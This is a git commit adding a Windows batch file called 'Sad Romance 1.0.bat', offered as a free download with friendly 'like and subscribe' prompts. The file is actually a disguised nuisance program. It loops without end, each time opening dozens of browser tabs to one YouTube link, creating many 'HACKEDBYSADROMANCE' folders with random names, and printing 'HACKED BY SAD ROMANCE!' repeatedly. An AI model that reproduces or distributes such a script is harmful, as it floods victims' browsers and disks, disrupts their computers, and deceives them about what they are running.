ff044cdab258efdaabfc46bca3cc21bdc9e5c381
sad_romance <sadromance8@gmail.com>
2025-10-03 13:30:55 +0300

    It's Free! Try it if you want!

---
+++ Sad Romance 1.0.bat
@@ -0,0 +1,136 @@
+@echo off
+echo hi! if you like it, please like and subscribe!
+pause
+echo if you want to listen, please like!
+pause
+echo now enjoy!
+timeout 2
+:enjoy
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+start https://youtube.com/ja7JAJNe8a0
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+md HACKEDBYSADROMANCE%random%%random%%random%%random%%random%
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+echo HACKED BY SAD ROMANCE!
+goto enjoy
